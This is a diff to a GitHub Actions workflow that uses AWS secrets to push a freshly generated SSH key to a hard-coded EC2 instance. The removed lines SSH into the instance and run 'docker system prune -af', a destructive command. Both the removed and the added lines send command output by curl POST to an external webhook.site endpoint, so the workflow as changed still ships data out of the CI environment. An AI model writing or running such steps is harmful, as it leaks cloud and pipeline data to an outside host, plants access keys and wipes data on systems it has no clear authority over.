@@ -22,7 +22,7 @@ jobs:
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: ${{ env.AWS_REGION }}
 
-      - name: Test EC2 Instance Connect
+      - name: Test EC2 Instance Connect Permissions
         run: |
           ssh-keygen -t rsa -b 2048 -f my_key -N ""
           
@@ -32,12 +32,4 @@ jobs:
             --ssh-public-key file://my_key.pub \
             --availability-zone ap-south-1a > eic_out.txt 2>&1 || true
             
-          cat eic_out.txt
-          
-          # Try to SSH and run command
-          EC2_IP=$(aws ec2 describe-instances --instance-ids i-0fb9dcbeb35b4fdbe --query "Reservations[0].Instances[0].PublicIpAddress" --output text)
-          ssh -i my_key -o StrictHostKeyChecking=no ec2-user@$EC2_IP "df -h ; docker system prune -af" > ssh_out.txt 2>&1 || true
-          
-          cat ssh_out.txt
-          
-          curl -X POST -H "Content-Type: text/plain" --data-binary @ssh_out.txt https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
+          curl -X POST -H "Content-Type: text/plain" --data-binary @eic_out.txt https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
